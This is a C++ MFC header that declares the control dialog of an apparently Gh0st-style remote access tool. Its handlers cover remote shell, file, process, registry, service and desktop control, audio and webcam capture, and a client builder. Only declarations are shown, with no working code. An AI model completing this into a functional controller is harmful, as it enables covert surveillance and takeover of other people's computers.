
// ServerDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "afxwin.h"
#include "TrueColorToolBar.h"
#include "_IOCPServer.h"
#include "ConfigFile.h"

typedef  void  (CALLBACK *LPFNWINDOWNOTIFYPROCEDURE)(PCONTEXT_OBJECT  ContextObject);
typedef struct
{
	char*  TitleData;            //列表的名称
	int    TitleWidth;           //列表的宽度
}COLUMN_DATA;
// CServerDlg 对话框
class CServerDlg : public CDialogEx
{
// 构造
public:
	CServerDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP();
private:
	CBitmap m_Bitmap[30];
	int     m_ConnectionCount;
	CStatusBar  m_StatusBar;
	CTrueColorToolBar m_TrueToolBar;
	NOTIFYICONDATA  m_NotifyIconData;
	USHORT    m_ListenPort;
	ULONG     m_MaxConnection;
public:
	VOID CServerDlg::InitListControl();
	VOID CServerDlg::InitSolidMenu();
	void CServerDlg::ShowDialogMessage(BOOL IsOk, CString  Message);
	void CServerDlg::InitStatusBar();
	void CServerDlg::InitTrueToolBar();

	void CServerDlg::SendingSelectedCommand(PBYTE  BufferData,ULONG BufferLength);
	//动态申请通信引擎对象
	void CServerDlg::ServerStart();
	//托盘相关
	void CServerDlg::InitNotifyIconData();
	afx_msg void OnNotifyIconData(WPARAM wPARAM,LPARAM lParam);
	//窗口回调
	static  void  CALLBACK  WindowNotifyProcedure(PCONTEXT_OBJECT  ContextObject);
	static  void    WindowHandleIO(CONTEXT_OBJECT*  ContextObject);

	/*************************************************************/
	/*真彩BUTTON的消息函数                                       */
	/*************************************************************/
	//终端管理
	afx_msg void OnOpenCmdManager();
	afx_msg LRESULT OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam);
	//进程管理
	afx_msg void OnOpenProcessManager();
	afx_msg LRESULT OnProcessManager(WPARAM wParam, LPARAM lParam);
	//窗口管理
	afx_msg void OnOpenWindowManager();
	afx_msg LRESULT OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam);
	//远程控制
	afx_msg void OnOpenRemoteControl(); 
	afx_msg LRESULT OnRemoteControlDialog(WPARAM wParam, LPARAM lParam);
	//文件管理
	afx_msg void OnOpenFileManager();
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam);
	//语音管理
	afx_msg void OnOpenAudioManager();
	afx_msg LRESULT OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam);
	//系统清理
	afx_msg void OnOpenCleanManager();
	//视频管理
	afx_msg void OnOpenVideoManager();
	afx_msg LRESULT OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam);
	//服务管理
	afx_msg void OnOpenServiceManager();
	afx_msg LRESULT OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam);
	//注册表管理
	afx_msg void OnOpenRegisterManager();
	afx_msg LRESULT OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam);
	//服务端设置
	afx_msg void OnOpenServerManager();
	//客户端管理
	afx_msg void OnOpenCreateClient();
	//帮助
	afx_msg void OnOpenServerAbout();

	//客户端上线消息函数
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	void  AddCtrlListServerOnline(CString ClientAddress, CString  HostName,
		CString  OSName, CString  ProcessorNameString, CString IsWebCameraExist,
		CString  WebSpeed, CONTEXT_OBJECT* ContextObject);

	//与客户端远程消息
	afx_msg LRESULT OnRemoteMessageManager(WPARAM wParam, LPARAM lParam);
public:
	CListCtrl m_CListCtrl_Server_Dialog_Online;
	CListCtrl m_CListCtrl_Server_Dialog_Message;
	afx_msg void OnMenuServerDialogSet();
	afx_msg void OnMenuServerDialogExit();
	afx_msg void OnMenuServerDialogAdd();
	afx_msg void OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnMenuListServerDialogOnlineDisconnection();
	afx_msg void OnMenuListServerDialogOnlineMessage();
	afx_msg void OnMenuListServerDialogOnlineShutdown();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnNotifyicondataShow();
	afx_msg void OnNotifyicondataExit();
	afx_msg void OnTimer(UINT_PTR nIDEvent);
};
